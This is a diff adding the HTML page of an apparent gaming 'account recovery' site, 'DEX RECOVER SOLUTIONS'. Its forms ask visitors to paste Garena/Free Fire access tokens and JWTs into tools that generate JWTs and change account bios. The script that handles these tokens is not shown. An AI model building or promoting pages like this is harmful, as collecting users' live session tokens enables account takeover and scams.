@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DEX RECOVER SOLUTIONS - Professional Account Recovery</title>
+    <meta name="description"
+        content="Expert account recovery solutions for gamers. Fast, secure, and reliable service.">
+    <link rel="stylesheet" href="/static/styles-dex.css">
+    <link rel="stylesheet" href="/static/search-styles.css">
+    <link rel="stylesheet" href="/static/service-btn-fix.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+</head>
+
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo-container">
+                <div class="logo-icon">DEX</div>
+                <div class="logo-text">
+                    <span class="logo-main">RECOVER</span>
+                    <span class="logo-sub">SOLUTIONS</span>
+                </div>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#home" class="nav-link active">Home</a></li>
+                <li><a href="#tools" class="nav-link">Tools</a></li>
+                <li><a href="#services" class="nav-link">Services</a></li>
+                <li><a href="#features" class="nav-link">Features</a></li>
+                <li><a href="#contact" class="nav-link">Contact</a></li>
+            </ul>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section id="home" class="hero">
+        <div class="hero-bg-animation"></div>
+        <div class="particles" id="particles"></div>
+        <div class="hero-content">
+            <div class="hero-badge">🔥 #1 Recovery Service</div>
+            <h1 class="hero-title">
+                <span class="title-line">DEX</span>
+                <span class="title-line highlight">RECOVER</span>
+                <span class="title-line">SOLUTIONS</span>
+            </h1>
+            <p class="hero-subtitle">Fast, Secure & Professional Recovery for Your Gaming Accounts</p>
+            <div class="hero-search">
+                <form id="eatTokenForm" class="eat-token-form">
+                    <input type="text" id="eatTokenInput" placeholder="Enter your EAT Token..." required>
+                    <button type="submit" class="btn-search">
+                        <span>🔍 Search Token</span>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Loading Indicator -->
+            <div id="loadingIndicator" class="loading-indicator" style="display: none;">
+                <div class="spinner"></div>
+                <p>Searching token...</p>
+            </div>
+
+            <!-- Results Section -->
+            <div id="resultsSection" class="results-section" style="display: none;">
+                <div class="results-header">
+                    <h2>✅ Account Found!</h2>
+                    <button class="btn-close"
+                        onclick="document.getElementById('resultsSection').style.display='none'">✕</button>
+                </div>
+                <div id="resultsContent" class="results-content"></div>
+            </div>
+
+            <!-- Error Section -->
+            <div id="errorSection" class="error-section" style="display: none;">
+                <div class="error-header">
+                    <h2>❌ Error</h2>
+                    <button class="btn-close"
+                        onclick="document.getElementById('errorSection').style.display='none'">✕</button>
+                </div>
+                <p id="errorMessage"></p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Advanced Tools Section -->
+    <section id="tools" class="tools-section">
+        <div class="container">
+            <h2 class="section-title">Advanced Tools</h2>
+            <p class="section-subtitle">Professional account analysis and security tools</p>
+
+            <div class="tools-grid">
+                <!-- JWT Generator -->
+                <div class="tool-card">
+                    <div class="tool-icon">�</div>
+                    <h3>JWT Generator</h3>
+                    <p>Generate JWT Token from Garena Access Token</p>
+                    <form class="tool-form" id="jwtForm">
+                        <input type="text" name="eat_token" placeholder="Enter Access Token (Hex)..." required>
+                        <button type="submit" class="tool-btn">Generate JWT</button>
+                    </form>
+                    <div class="tool-results" id="jwtResults"></div>
+                </div>
+
+                <!-- UID Lookup -->
+                <div class="tool-card">
+                    <div class="tool-icon">🔍</div>
+                    <h3>UID Lookup</h3>
+                    <p>Search player information by Free Fire UID</p>
+                    <form class="tool-form" id="uidForm">
+                        <input type="text" name="uid" placeholder="Enter Free Fire UID..." required>
+                        <button type="submit" class="tool-btn">Search Player</button>
+                    </form>
+                    <div class="tool-results" id="uidResults"></div>
+                </div>
+
+                <!-- Ban Status Checker -->
+                <div class="tool-card">
+                    <div class="tool-icon">🚫</div>
+                    <h3>Ban Status Checker</h3>
+                    <p>Check if an account is restricted or banned by UID</p>
+                    <form class="tool-form" id="banForm">
+                        <input type="text" name="uid" placeholder="Enter Free Fire UID..." required>
+                        <button type="submit" class="tool-btn">Check Status</button>
+                    </form>
+                    <div class="tool-results" id="banResults"></div>
+                </div>
+
+                <!-- Account Info Display -->
+                <div class="tool-card">
+                    <div class="tool-icon">📊</div>
+                    <h3>Account Info Display</h3>
+                    <p>View detailed account statistics and data</p>
+                    <form class="tool-form" id="accountForm">
+                        <input type="text" name="uid" placeholder="Enter Free Fire UID..." required>
+                        <button type="submit" class="tool-btn">Get Account Info</button>
+                    </form>
+                    <div class="tool-results" id="accountResults"></div>
+                </div>
+
+                <!-- Bio Update Tool -->
+                <div class="tool-card">
+                    <div class="tool-icon">✍️</div>
+                    <h3>Update Signature</h3>
+                    <p>Change your Free Fire Bio/Signature instantly</p>
+                    <form class="tool-form" id="bioForm">
+                        <textarea name="token" placeholder="Paste your Access Token (JWT) here..." required
+                            style="width: 100%; padding: 0.8rem; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 107, 53, 0.3); border-radius: 8px; color: white; margin-bottom: 1rem; min-height: 80px; font-family: monospace;"></textarea>
+                        <input type="text" name="bio_text" placeholder="Enter new signature (e.g. Verified by DEX)..."
+                            required>
+                        <button type="submit" class="tool-btn">Update Bio</button>
+                    </form>
+                    <div class="tool-results" id="bioResults"></div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="services">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">Our Services</span>
+                <h2 class="section-title">Professional Recovery Solutions</h2>
+                <p class="section-subtitle">We offer comprehensive account recovery services with guaranteed results</p>
+            </div>
+            <div class="services-grid">
+                <div class="service-card">
+                    <div class="service-icon">🎮</div>
+                    <h3>Game Account Recovery</h3>
+                    <p>Recover lost or hacked gaming accounts including Free Fire, PUBG, COD Mobile, and more.</p>
+                    <ul class="service-features">
+                        <li>✓ All major games supported</li>
+                        <li>✓ Fast 24-48h turnaround</li>
+                        <li>✓ Data protection guaranteed</li>
+                    </ul>
+                    <a href="https://www.instagram.com/__dexzzz" target="_blank" rel="noopener" class="service-btn"
+                        onclick="window.open('https://www.instagram.com/__dexzzz', '_blank'); return true;">CONTACT
+                        NOW</a>
+                </div>
+                <div class="service-card featured">
+                    <div class="popular-badge">Most Popular</div>
+                    <div class="service-icon">🛡️</div>
+                    <h3>Security Enhancement</h3>
+                    <p>Strengthen your account security with our advanced protection protocols and monitoring.</p>
+                    <ul class="service-features">
+                        <li>✓ Two-factor authentication setup</li>
+                        <li>✓ Real-time threat monitoring</li>
+                        <li>✓ Security audit included</li>
+                    </ul>
+                    <a href="https://www.instagram.com/__dexzzz" target="_blank" rel="noopener" class="service-btn"
+                        onclick="window.open('https://www.instagram.com/__dexzzz', '_blank'); return true;">CONTACT
+                        NOW</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="features">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">Why Choose Us</span>
+                <h2 class="section-title">Unmatched Excellence</h2>
+            </div>
+            <div class="features-grid">
+                <div class="feature-item">
+                    <div class="feature-icon">🔒</div>
+                    <h3>100% Secure</h3>
+                    <p>End-to-end encryption and strict confidentiality protocols</p>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Lightning Fast</h3>
+                    <p>Average recovery time of 24-48 hours</p>
+                </div>
+
+
+                <div class="feature-item">
+                    <div class="feature-icon">💰</div>
+                    <h3>Best Pricing</h3>
+                    <p>Competitive rates with flexible payment options</p>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">✅</div>
+                    <h3>Guaranteed Results</h3>
+                    <p>99% success rate or your money back</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact">
+        <div class="container">
+            <div class="contact-content">
+                <div class="contact-info">
+                    <h2>Ready to Recover Your Account?</h2>
+                    <p>Get in touch with our expert team today and let us help you regain access to your valuable gaming
+                        accounts.</p>
+                    <div class="contact-methods">
+                        <div class="contact-method">
+                            <div class="contact-icon">📧</div>
+                            <div>
+                                <h4>Email Us</h4>
+                                <p>collegegamerff@gmail.com</p>
+                            </div>
+                        </div>
+                        <div class="contact-method">
+                            <div class="contact-icon">💬</div>
+                            <div>
+                                <h4>Live Chat</h4>
+                                <p>Available 24/7</p>
+                            </div>
+                        </div>
+                        <div class="contact-method">
+                            <div class="contact-icon">⏱️</div>
+                            <div>
+                                <h4>Response Time</h4>
+                                <p>Under 1 hour</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="contact-form-wrapper">
+                    <form class="contact-form" id="contactForm" action="https://formsubmit.co/collegegamerff@gmail.com"
+                        method="POST">
+                        <!-- FormSubmit Configuration -->
+                        <input type="hidden" name="_subject" value="New Contact Form Submission - DEX RECOVER">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
+                        <input type="text" name="_honey" style="display:none">
+
+                        <div class="form-group">
+                            <input type="text" name="name" placeholder="Your Name" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="email" name="email" placeholder="Your Email" required>
+                        </div>
+                        <div class="form-group">
+                            <select name="service" aria-label="Select service type" required>
+                                <option value="">Select Service</option>
+                                <option value="game">Game Account Recovery</option>
+                                <option value="security">Security Enhancement</option>
+                                <option value="emergency">Emergency Recovery</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <textarea name="message" placeholder="Describe your issue..." rows="5" required></textarea>
+                        </div>
+                        <button type="submit" class="submit-btn">Send Message</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="footer-logo">
+                        <div class="logo-icon">DEX</div>
+                        <div class="logo-text">
+                            <span class="logo-main">RECOVER</span>
+                            <span class="logo-sub">SOLUTIONS</span>
+                        </div>
+                    </div>
+                    <p>The most trusted account recovery service in the gaming industry.</p>
+                </div>
+                <div class="footer-links">
+                    <h4>Quick Links</h4>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#services">Services</a></li>
+                        <li><a href="#features">Features</a></li>
+                        <li><a href="#contact">Contact</a></li>
+                    </ul>
+                </div>
+                <div class="footer-social">
+                    <h4>Follow Us</h4>
+                    <div class="social-icons">
+                        <a href="https://www.instagram.com/__dexzzz" target="_blank" rel="noopener" class="social-icon"
+                            aria-label="Instagram">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
+                                fill="currentColor">
+                                <path
+                                    d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
+                            </svg>
+                        </a>
+                        <a href="https://t.me/jaswanth_199" target="_blank" rel="noopener" class="social-icon"
+                            aria-label="Telegram">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
+                                fill="currentColor">
+                                <path
+                                    d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" />
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 DEX RECOVER SOLUTIONS. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/static/script-dex.js"></script>
+</body>
+
+</html>
